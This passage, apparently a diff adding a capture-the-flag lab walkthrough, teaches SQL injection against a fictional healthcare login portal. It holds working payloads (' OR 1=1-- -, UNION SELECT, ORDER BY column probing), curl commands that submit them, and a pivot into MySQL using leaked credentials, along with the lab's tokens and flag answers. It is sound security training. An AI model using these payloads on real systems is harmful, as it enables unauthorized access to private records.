+<li>A <strong>generic error page</strong> that differs from the normal "invalid credentials" response</li>
+</ul>
+<p>Any change in behavior compared to submitting a normal username suggests the input is reaching the SQL query unsanitized.</p>
+<h3 id="classic-bypass-or-11-">Classic Bypass: <code>' OR 1=1-- -</code></h3>
+<p>Once you confirm the field is injectable, the next step is attempting an authentication bypass. The most common payload is <code>' OR 1=1-- -</code>. Here is what happens when this is submitted as the username:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">id</span><span class="p">,</span><span class="w"> </span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="n">password</span><span class="p">,</span><span class="w"> </span><span class="n">email</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span>
+<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="k">WHERE</span><span class="w"> </span><span class="n">username</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="w"> </span><span class="k">OR</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="c1">-- -&#39; AND password=&#39;anything&#39;</span>
+</code></pre></div>
+<p>Breaking this down piece by piece:</p>
+<table>
+<thead>
+<tr>
+<th>Fragment</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>'</code></td>
+<td>Closes the username string that the application opened</td>
+</tr>
+<tr>
+<td><code>OR 1=1</code></td>
+<td>Adds a condition that is always true: every row in the table matches</td>
+</tr>
+<tr>
+<td><code>-- -</code></td>
+<td>SQL comment syntax that discards everything after it, including the <code>AND password=</code> check</td>
+</tr>
+</tbody>
+</table>
+<p>The query now returns <strong>every row</strong> in the users table. The application sees a result and logs the attacker in as the first user returned, usually the admin account. The bypass works because many login forms only check whether the query returned a row: the entire authentication decision lives inside the SQL WHERE clause, and the injection just made it always true.</p>
+<p>The <code>' OR 1=1-- -</code> technique is effective but blunt: it returns every user in the table and logs you in as whichever row comes back first. You have no control over which account you land on. For more precision, UNION-based injection is the better tool.</p>
+<h3 id="union-based-injection">UNION-Based Injection</h3>
+<p>UNION-based injection is more powerful. Instead of manipulating the WHERE clause to return existing rows, it appends an entirely new SELECT statement that returns data the attacker fabricates:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">id</span><span class="p">,</span><span class="w"> </span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="n">password</span><span class="p">,</span><span class="w"> </span><span class="n">email</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span>
+<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="k">WHERE</span><span class="w"> </span><span class="n">username</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="s1">&#39;admin&#39;</span><span class="p">,</span><span class="s1">&#39;x&#39;</span><span class="p">,</span><span class="s1">&#39;admin@test.com&#39;</span><span class="c1">-- -&#39;</span>
+<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="k">AND</span><span class="w"> </span><span class="n">password</span><span class="o">=</span><span class="s1">&#39;anything&#39;</span>
+</code></pre></div>
+<p>Here is what happens step by step:</p>
+<ol>
+<li>The original query searches for a user with an empty username: no rows match</li>
+<li>The <code>UNION SELECT</code> appends a second result set containing one fabricated row</li>
+<li>The <code>-- -</code> comments out the remaining original query (the password check)</li>
+<li>The database returns the fabricated row as the query result</li>
+<li>The application sees a row was returned and considers the login successful</li>
+</ol>
+<p><strong>Critical rule</strong>: the UNION SELECT must return the <strong>same number of columns</strong> as the original query. If the original SELECT retrieves four columns (id, username, password, email), your UNION must also provide exactly four values. If the column count does not match, the database returns an error like <em>"The used SELECT statements have a different number of columns."</em></p>
+<p>The values in the fabricated row can be anything: the application just checks whether a row was returned. The attacker controls every field: the username that appears in the session, the email, everything. Full control over the returned row is what makes UNION injection powerful beyond simple authentication bypass.</p>
+<h3 id="determining-the-column-count">Determining the Column Count</h3>
+<p>In a real assessment, you will not always know how many columns the original query selects. Two techniques help you discover the count:</p>
+<p><strong>ORDER BY method</strong>: inject <code>' ORDER BY 1-- -</code>, then <code>' ORDER BY 2-- -</code>, incrementing until the application returns an error. If <code>ORDER BY 4</code> works but <code>ORDER BY 5</code> fails, the query has four columns.</p>
+<p><strong>NULL method</strong>: inject <code>' UNION SELECT NULL-- -</code>, then <code>' UNION SELECT NULL,NULL-- -</code>, adding NULLs until the query succeeds. NULL is compatible with any column type, so this avoids type mismatch errors.</p>
+<p>In this exercise, the column count is provided in the hints, but knowing these techniques prepares you for real-world assessments where you must discover it yourself.</p>
+<h3 id="the-full-attack-flow">The Full Attack Flow</h3>
+<p>The following diagram shows the complete path from initial reconnaissance to flag capture in this exercise. Notice that the first three steps (enumeration, robots.txt, hidden portal) are identical to Exercise 10A. The divergence begins at the login form, where SQL injection replaces default credentials as the entry technique.</p>
+<pre class="mermaid"><code>graph TD
+    A["Scan target website"] --&gt; B["Check robots.txt&lt;br/&gt;for hidden paths"]
+    A --&gt; C["Run gobuster with&lt;br/&gt;common wordlist"]
+    B --&gt; D["Discover&lt;br/&gt;/portal/"]
+    C --&gt; D
+    D --&gt; E["Access login form"]
+    E --&gt; F["Test for SQL injection&lt;br/&gt;(single quote test)"]
+    F --&gt; G["Craft UNION SELECT&lt;br/&gt;payload (4 columns)"]
+    G --&gt; H["Bypass authentication&lt;br/&gt;access dashboard"]
+    H --&gt; I["Collect Token 1&lt;br/&gt;from dashboard"]
+    I --&gt; J["Extract DB credentials&lt;br/&gt;from config panel"]
+    J --&gt; K["Connect to MySQL&lt;br/&gt;query audit_flags"]
+    K --&gt; L["Collect Token 2&lt;br/&gt;assemble flag"]
+
+    style A fill:#4a90d9,color:#fff
+    style B fill:#4a90d9,color:#fff
+    style C fill:#4a90d9,color:#fff
+    style D fill:#e8a735,color:#fff
+    style E fill:#e8a735,color:#fff
+    style F fill:#e8a735,color:#fff
+    style G fill:#d9534f,color:#fff
+    style H fill:#d9534f,color:#fff
+    style I fill:#6aaa64,color:#fff
+    style J fill:#6aaa64,color:#fff
+    style K fill:#6aaa64,color:#fff
+    style L fill:#6aaa64,color:#fff</code></pre>
+<p><strong>Color key</strong>: Blue = reconnaissance, Orange = discovery, Red = exploitation (SQL injection), Green = post-exploitation and data extraction.</p>
+<h3 id="exercise-10a-vs-10b-two-paths-past-the-login-form">Exercise 10A vs 10B: Two Paths Past the Login Form</h3>
+<p>Both exercises follow the same structure: enumerate hidden paths, find a login form, get past it, extract data from the dashboard and database. The difference is <em>how</em> you get past the login.</p>
+<pre class="mermaid"><code>graph LR
+    A["Hidden Portal&lt;br/&gt;Discovered"] --&gt; B{"Login Form"}
+    B --&gt;|"Exercise 10A"| C["Default credentials&lt;br/&gt;(admin / CompanyYear#)"]
+    B --&gt;|"Exercise 10B"| D["SQL injection&lt;br/&gt;(UNION SELECT)"]
+    C --&gt; E["Dashboard&lt;br/&gt;→ DB Credentials&lt;br/&gt;→ Flag"]
+    D --&gt; E
+
+    style B fill:#e8a735,color:#fff
+    style C fill:#4a90d9,color:#fff
+    style D fill:#d9534f,color:#fff
+    style E fill:#6aaa64,color:#fff</code></pre>
+<p>In 10A, the developers left default credentials in place, a configuration error. In 10B, the developers wrote vulnerable code, a programming error. Both are common in the real world, and a penetration tester needs to recognize and exploit both.</p>
+<hr />
+<h2 id="tool-primer-curl-for-form-submission">Tool Primer: curl for Form Submission</h2>
+<p>You used curl in Exercise 10A to send GET requests and POST login forms. SQL injection testing uses the same POST technique, but the payloads in the form data contain SQL syntax instead of normal credentials.</p>
+<p><strong>Sending a POST request with form data:</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>curl<span class="w"> </span>-s<span class="w"> </span>http://&lt;target&gt;/portal/login<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="w">  </span>-d<span class="w"> </span><span class="s1">&#39;username=testuser&amp;password=testpass&#39;</span>
+</code></pre></div>
+<p>The <code>-d</code> flag automatically sets the request method to POST: you do not need <code>-X POST</code>. In fact, using <code>-X POST</code> explicitly can cause problems: when combined with <code>-L</code> (follow redirects), curl will re-send the POST to the redirect target. Most login forms redirect to a dashboard via GET after success, so the dashboard route rejects the unexpected POST with a <code>405 Method Not Allowed</code> error. By omitting <code>-X POST</code> and relying on <code>-d</code> to imply it, curl correctly switches to GET when following the redirect.</p>
+<p><strong>Common flags:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>-d</code></td>
+<td>Form data (URL-encoded key=value pairs separated by <code>&amp;</code>); implies POST</td>
+</tr>
+<tr>
+<td><code>-c &lt;file&gt;</code></td>
+<td>Save cookies from the response to a file</td>
+</tr>
+<tr>
+<td><code>-b &lt;file&gt;</code></td>
+<td>Send cookies from a file with the request</td>
+</tr>
+<tr>
+<td><code>-L</code></td>
+<td>Follow redirects (login forms typically redirect after success)</td>
+</tr>
+<tr>
+<td><code>-s</code></td>
+<td>Silent mode (suppress progress output)</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Saving and reusing session cookies:</strong></p>
+<p>After a successful login (whether through default credentials or SQL injection), the server sets a session cookie. You must save this cookie and send it with subsequent requests to access authenticated pages.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="c1"># Login and save session cookie</span>
+<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>curl<span class="w"> </span>-s<span class="w"> </span>-c<span class="w"> </span>/tmp/cookies<span class="w"> </span>http://&lt;target&gt;/portal/login<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a><span class="w">  </span>-d<span class="w"> </span><span class="s1">&#39;username=admin&amp;password=pass&#39;</span><span class="w"> </span>-L
+<a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>
+<a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a><span class="c1"># Access authenticated page using saved cookie</span>
+<a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a>curl<span class="w"> </span>-s<span class="w"> </span>-b<span class="w"> </span>/tmp/cookies<span class="w"> </span>http://&lt;target&gt;/portal/dashboard
+</code></pre></div>
+<p>The <code>-c</code> flag writes cookies to a file after the response. The <code>-b</code> flag reads cookies from that file and includes them in the next request. Without the cookie, the dashboard will redirect you back to the login page.</p>
+<h3 id="mysql-cli-review-from-exercise-10a">MySQL CLI (Review from Exercise 10A)</h3>
+<p>You will use the MySQL command-line client again in the final phase to query the backend database directly.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>mysql<span class="w"> </span>--skip-ssl<span class="w"> </span>-h<span class="w"> </span>&lt;db_ip&gt;<span class="w"> </span>-u<span class="w"> </span>&lt;username&gt;<span class="w"> </span>-p<span class="s1">&#39;&lt;password&gt;&#39;</span><span class="w"> </span>&lt;database_name&gt;<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="w">  </span>-e<span class="w"> </span><span class="s2">&quot;SELECT * FROM table_name&quot;</span>
+</code></pre></div>
+<table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>-h</code></td>
+<td>Hostname or IP of the database server</td>
+</tr>
+<tr>
+<td><code>-u</code></td>
+<td>Username to authenticate with</td>
+</tr>
+<tr>
+<td><code>-p</code></td>
+<td>Password (no space between <code>-p</code> and the password)</td>
+</tr>
+<tr>
+<td><code>-e</code></td>
+<td>Execute a single SQL query and exit</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="walkthrough">Walkthrough</h2>
+<h3 id="step-1-launch-the-exercise">Step 1: Launch the Exercise</h3>
+<p>Open the platform in your browser and start the exercise environment. Wait for all containers to reach the <strong>Running</strong> state before proceeding.</p>
+<ul>
+<li>Navigate to <strong>Exercises</strong> and locate the <strong>Web</strong> track</li>
+<li>Find <strong>SQL Injection to Shell</strong> and click <strong>Launch</strong></li>
+<li>Wait for the status to change to <strong>Running</strong></li>
+<li>Note the <strong>target IP addresses</strong> displayed in the Active Lab View; the web application and database server run on separate hosts</li>
+</ul>
+<h3 id="step-2-browse-the-main-site-and-check-robotstxt">Step 2: Browse the Main Site and Check robots.txt</h3>
+<p>Start the same way you did in Exercise 10A: visit the target website to see what is publicly visible, then check for a robots.txt file. The browse-then-robots.txt sequence is the same reconnaissance workflow you will use on every web application assessment.</p>
+<div class="admonition kali">
+<p class="admonition-title">Browse the main site</p>
+<p>Browse to the main page first to see what is publicly visible.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>curl<span class="w"> </span>-s<span class="w"> </span>http://&lt;target_ip&gt;/
+</code></pre></div>
+<p>The main site is a corporate healthcare landing page for Vertex Healthcare. The navigation links (Home, About, Services, Contact) are standard marketing pages. Nothing interactive is visible.</p>
+</div>
+<div class="admonition kali">
+<p class="admonition-title">Check robots.txt for hidden paths</p>
+<p>Now check robots.txt for paths the developers excluded from search indexes.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>curl<span class="w"> </span>-s<span class="w"> </span>http://&lt;target_ip&gt;/robots.txt
+</code></pre></div>
+<p>Review the output carefully. You should see <code>Disallow</code> entries listing paths the developers wanted to keep out of search engine indexes. One of those paths points to a portal. Note each path you find; you will visit them in a later step.</p>
+</div>
+<h3 id="step-3-run-gobuster-to-confirm-hidden-paths">Step 3: Run gobuster to Confirm Hidden Paths</h3>
+<p>Reinforce your directory enumeration skills from Exercise 10A. While robots.txt reveals paths the developers intentionally listed, gobuster may uncover additional endpoints that the file does not mention.</p>
+<div class="admonition kali">
+<p class="admonition-title">Brute-force directories with gobuster</p>
+<p>Run gobuster against the target with a common wordlist to discover endpoints robots.txt does not list.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>gobuster<span class="w"> </span>dir<span class="w"> </span>-u<span class="w"> </span>http://&lt;target_ip&gt;<span class="w"> </span>-w<span class="w"> </span>/usr/share/wordlists/dirb/common.txt
+</code></pre></div>
+<p>Wait for the scan to complete. Compare the gobuster results with the paths you found in robots.txt. You should see a <code>/portal</code> entry among the results; a path that strongly suggests an internal login page. Additional entries like <code>/api/internal/</code> and <code>/backups/</code> may appear: you can investigate these, but the portal is the primary target.</p>
+</div>
+<h3 id="step-4-access-the-hidden-portal">Step 4: Access the Hidden Portal</h3>
+<div class="admonition kali">
+<p class="admonition-title">Access the hidden portal</p>
+<p>Navigate to the portal path you discovered with gobuster and robots.txt.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>curl<span class="w"> </span>-s<span class="w"> </span>http://&lt;target_ip&gt;/portal/
+</code></pre></div>
+<p>You should see a login form for the <strong>Vertex Provider Portal</strong>. Unlike Exercise 10A where the NovaTech staff portal had a build tag comment in the HTML source (token 1), the Vertex portal login page does not contain any comments, tokens, or embedded credentials. The HTML is clean.</p>
+</div>
+<figure>
+<p><img alt="Vertex Provider Portal login form rendered in a browser" src="../img/cw-26-login.png" width="420" />
+  </p>
+<figcaption>The Vertex Provider Portal login form. The HTML source is clean, with no leaked credentials, so SQL injection becomes the way past this gate.</figcaption>
+</figure>
+<p>The clean HTML means you cannot extract information from the page source, and you do not have any known credentials to try. You need a different approach to get past the login form.</p>
+<h3 id="step-5-test-for-sql-injection">Step 5: Test for SQL Injection</h3>
+<p>With no known credentials and no information leakage in the HTML source, test whether the login form is vulnerable to SQL injection.</p>
+<div class="admonition kali">
+<p class="admonition-title">Send the single quote test</p>
+<p>Start with the single quote test described in the background section to see whether input reaches the query.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>curl<span class="w"> </span>-s<span class="w"> </span>http://&lt;target_ip&gt;/portal/login<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a><span class="w">  </span>-d<span class="w"> </span><span class="s2">&quot;username=&#39;&amp;password=test&quot;</span>
+</code></pre></div>
+<p>Observe the response. The application redirects you back to the login page with an error parameter: its generic "invalid credentials" response. A single quote alone does not give you access, but importantly, the application did not return a database error or block your request with a WAF (Web Application Firewall). The input reached the query.</p>
+</div>
+<div class="admonition kali">
+<p class="admonition-title">Attempt the classic OR 1=1 bypass</p>
+<p>Now test the classic authentication bypass payload.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>curl<span class="w"> </span>-s<span class="w"> </span>-c<span class="w"> </span>/tmp/vtx-cookies<span class="w"> </span>http://&lt;target_ip&gt;/portal/login<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a><span class="w">  </span>-d<span class="w"> </span><span class="s2">&quot;username=&#39; OR 1=1-- -&amp;password=anything&quot;</span><span class="w"> </span>-L
+</code></pre></div>
+<p>Check the response. If you see dashboard HTML instead of a login form, the bypass worked: the application only checks whether the SQL query returned a row, and <code>OR 1=1</code> makes every row match. The <code>-c</code> flag saved your session cookie. You can skip ahead to Step 7 to access the dashboard.</p>
+</div>
+<p>If you want more control over the injection, or if you want to practice the more precise technique, proceed to the UNION-based approach below.</p>
+<h3 id="step-6-craft-a-union-based-sql-injection-payload">Step 6: Craft a UNION-Based SQL Injection Payload</h3>
+<p>The <code>' OR 1=1-- -</code> bypass returns every user in the table and logs you in as whichever account comes back first. The UNION technique gives you more precision: you fabricate an exact row so the application receives only the data you choose.</p>
+<p>The login query selects four columns: <code>id</code>, <code>username</code>, <code>password</code>, and <code>email</code>. Your UNION SELECT must provide exactly four values to match. The values themselves can be anything: the application only cares that a row was returned.</p>
+<p><strong>Username field:</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>&#39; UNION SELECT 1,&#39;admin&#39;,&#39;x&#39;,&#39;admin@vertex.com&#39;-- -
+</code></pre></div></p>
+<p><strong>Password field:</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>anything
+</code></pre></div></p>
+<p>Here is what the database sees after the application pastes your input into the query:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">id</span><span class="p">,</span><span class="w"> </span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="n">password</span><span class="p">,</span><span class="w"> </span><span class="n">email</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span>
+<a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a><span class="k">WHERE</span><span class="w"> </span><span class="n">username</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="s1">&#39;admin&#39;</span><span class="p">,</span><span class="s1">&#39;x&#39;</span><span class="p">,</span><span class="s1">&#39;admin@vertex.com&#39;</span><span class="c1">-- -&#39;</span>
+<a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a><span class="k">AND</span><span class="w"> </span><span class="n">password</span><span class="o">=</span><span class="s1">&#39;anything&#39;</span>
+</code></pre></div>
+<p>Walking through it:</p>
+<ol>
+<li><code>username=''</code>: the original WHERE clause searches for an empty username and finds nothing</li>
+<li><code>UNION SELECT 1,'admin','x','admin@vertex.com'</code>: appends your fabricated row with four values matching the four columns</li>
+<li><code>-- -</code>: comments out the rest of the query, including the <code>AND password='anything'</code> check</li>
+<li>The database returns one row: your fabricated data</li>
+<li>The application sees a row was returned and logs you in</li>
+</ol>
+<div class="admonition kali">
+<p class="admonition-title">Submit the UNION injection</p>
+<p>Submit the UNION payload through the login form to fabricate a matching row.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>curl<span class="w"> </span>-s<span class="w"> </span>-c<span class="w"> </span>/tmp/vtx-cookies<span class="w"> </span>http://&lt;target_ip&gt;/portal/login<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a><span class="w">  </span>-d<span class="w"> </span><span class="s2">&quot;username=&#39; UNION SELECT 1,&#39;admin&#39;,&#39;x&#39;,&#39;admin@vertex.com&#39;-- -&amp;password=anything&quot;</span><span class="w"> </span>-L
+</code></pre></div>
+<p>The <code>-c</code> flag saves the session cookie so you can access authenticated pages. The <code>-L</code> flag follows the redirect to the dashboard. If the response contains dashboard HTML rather than a login form, the injection succeeded.</p>
+</div>
+<h3 id="step-7-access-the-dashboard-and-collect-token-1">Step 7: Access the Dashboard and Collect Token 1</h3>
+<p>After a successful injection, the application sets a session cookie and redirects you to the provider dashboard. If the dashboard content appeared in the Step 5 or Step 6 response, you already have it.</p>
+<div class="admonition kali">
+<p class="admonition-title">Access the dashboard with the saved cookie</p>
+<p>Access the dashboard explicitly using the session cookie you saved during the injection.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>curl<span class="w"> </span>-s<span class="w"> </span>-b<span class="w"> </span>/tmp/vtx-cookies<span class="w"> </span>http://&lt;target_ip&gt;/portal/dashboard
+</code></pre></div>
+<p>Read through the dashboard HTML carefully. The <strong>System Status</strong> table lists several application components and their values. Look for the <strong>Assessment Token</strong> row: its value column contains the first token: <code>sql1_un10n</code>.</p>
+</div>
+<p>Record this value. Token 1 represents the fact that you bypassed authentication through SQL injection. In a real assessment, reaching an authenticated dashboard without valid credentials is a critical finding.</p>
+<figure>
+<p><img alt="Vertex provider dashboard reached through SQL injection, showing a system status table and an exposed configuration panel" src="../img/cw-26-dashboard.png" width="820" />
+  </p>
+<figcaption>The provider dashboard reached without any valid credentials. The Assessment Token value is redacted to keep the flag hidden, but the Application Configuration panel exposes the backend MySQL host, user, and password.</figcaption>
+</figure>
+<h3 id="step-8-extract-database-credentials-from-the-dashboard">Step 8: Extract Database Credentials from the Dashboard</h3>
+<p>Continue reading the dashboard output. Below the system status table and quick links section, an <strong>Application Configuration</strong> panel displays environment variables in a monospace block. The exposed configuration panel repeats the same pattern you saw in Exercise 10A's NovaTech dashboard: developers exposing backend configuration in a web interface.</p>
+<p>Look for these fields:</p>
+<table>
+<thead>
+<tr>
+<th>Variable</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>DB_HOST</code></td>
+<td>Database server hostname</td>
+</tr>
+<tr>
+<td><code>DB_PORT</code></td>
+<td>Database port (3306 for MySQL)</td>
+</tr>
+<tr>
+<td><code>DB_NAME</code></td>
+<td>Database name</td>
+</tr>
+<tr>
+<td><code>DB_USER</code></td>
+<td>Database admin username</td>
+</tr>
+<tr>
+<td><code>DB_PASS</code></td>
+<td>Database admin password</td>
+</tr>
+</tbody>
+</table>
+<p>Record all the database connection values. These credentials give you direct access to the backend database, bypassing the web application entirely. Notice the <code>DB_USER</code> here is an admin-level account (not the limited application account the web app uses internally): this is a common mistake where dashboards expose higher-privilege credentials than necessary.</p>
+<h3 id="step-9-connect-to-mysql-and-retrieve-token-2">Step 9: Connect to MySQL and Retrieve Token 2</h3>
+<div class="admonition kali">
+<p class="admonition-title">Query the MySQL backend directly</p>
+<p>Use the database credentials from the dashboard to connect to the MySQL server. The database server's IP address is shown in the lab topology (the <code>.37</code> offset on the subnet).</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>mysql<span class="w"> </span>--skip-ssl<span class="w"> </span>-h<span class="w"> </span>&lt;db_ip&gt;<span class="w"> </span>-u<span class="w"> </span>vtx_admin<span class="w"> </span>-p<span class="s1">&#39;Vtx_DB_R00t#&#39;</span><span class="w"> </span>vertex_portal<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a><span class="w">  </span>-e<span class="w"> </span><span class="s2">&quot;SELECT * FROM audit_flags&quot;</span>
+</code></pre></div>
+<p>The <code>audit_flags</code> table contains several rows including health checks, backup verifications, and schema versions. Look for the row where the <code>name</code> column is <code>assessment</code>; its <code>value</code> column contains the second token: <code>3xtr4ct</code>.</p>
+</div>
+<p>Record this value. Token 2 represents the fact that you pivoted from the web application layer to the database layer using leaked credentials: the same technique from Exercise 10A, but this time you reached the dashboard through SQL injection rather than default credentials.</p>
+<figure>
+<p><img alt="Terminal session connecting to the backend MySQL server and querying the audit_flags table" src="../img/cw-26-shell.png" width="820" />
+  </p>
+<figcaption>A direct MySQL session opened with the leaked dashboard credentials, dumping the `audit_flags` table. The `assessment` row value is masked so the flag stays hidden; the point is that web-layer credentials pivoted straight into the database.</figcaption>
+</figure>
+<hr />
+<h3 id="record-your-findings">Record Your Findings</h3>
+<blockquote>
+<p><strong>robots.txt contents:</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>(paste the robots.txt output here)
+</code></pre></div>
+<p><strong>gobuster results:</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>(paste your gobuster output here)
+</code></pre></div>
+<p><strong>Hidden portal path discovered:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Source</th>
+<th>Path</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>robots.txt</td>
+<td></td>
+</tr>
+<tr>
+<td>gobuster</td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<p><strong>SQL injection details:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Injection Point</th>
+<th>Endpoint</th>
+<th>Injection Type</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<p><strong>SQL injection payload used:</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>(paste your UNION SELECT payload here)
+</code></pre></div>
+<p><strong>Token 1 (from dashboard after SQL injection bypass):</strong></p>
+<table>
+<thead>
+<tr>
+<th>Source</th>
+<th>Token Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<p><strong>Database credentials discovered:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Username</th>
+<th>Password</th>
+<th>Source</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<p><strong>Token 2 (from MySQL audit_flags table):</strong></p>
+<table>
+<thead>
+<tr>
+<th>Source</th>
+<th>Token Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+</blockquote>
+<hr />
+<h3 id="step-10-interpret-the-results">Step 10: Interpret the Results</h3>
+<p>Review the two tokens you collected and consider what each one represents in the context of a real-world assessment.</p>
+<ul>
+<li>
+<p><strong>Token 1 (dashboard via SQL injection)</strong>: The patient portal's login form was vulnerable to SQL injection because the developers used string concatenation to build the SQL query. An attacker with no credentials at all could bypass authentication and access the full provider dashboard. In a healthcare context, this dashboard could expose patient records, clinical data, and system configurations. Authentication bypass of this kind is a critical finding under both OWASP and HIPAA frameworks.</p>
+</li>
+<li>
+<p><strong>Token 2 (MySQL database via leaked credentials)</strong>: The dashboard's configuration panel exposed database admin credentials in plaintext. Combined with the fact that the database server accepted connections from any host on the subnet, an attacker can query the database directly. Direct database access bypasses any application-level access controls and exposes every table the admin account can read. In a real healthcare environment, this could include patient health information (PHI) protected under HIPAA.</p>
+</li>
+</ul>
+<p>The two tokens together demonstrate a <strong>chained attack</strong>: SQL injection provided the initial foothold (dashboard access), and information disclosure on the dashboard enabled lateral movement to the database layer. Neither vulnerability alone would be as damaging, but together they create a path from zero access to full database compromise.</p>
+<h3 id="step-11-assemble-and-submit-the-flag">Step 11: Assemble and Submit the Flag</h3>
+<p>Combine the two tokens in the order you discovered them:</p>
+<div class="admonition tip">
+<p class="admonition-title">Flag Format</p>
+<p>Assemble the flag using the tokens in the order you discovered them:</p>
+<p><code>OCR{sqli-bypass_db-extract}</code></p>
+<p>Where <code>sqli-bypass</code> is from the dashboard after SQL injection, and <code>db-extract</code> is from the MySQL <code>audit_flags</code> table.</p>
+</div>
+<blockquote>
+<p><strong>Assembled flag:</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>OCR{_____}
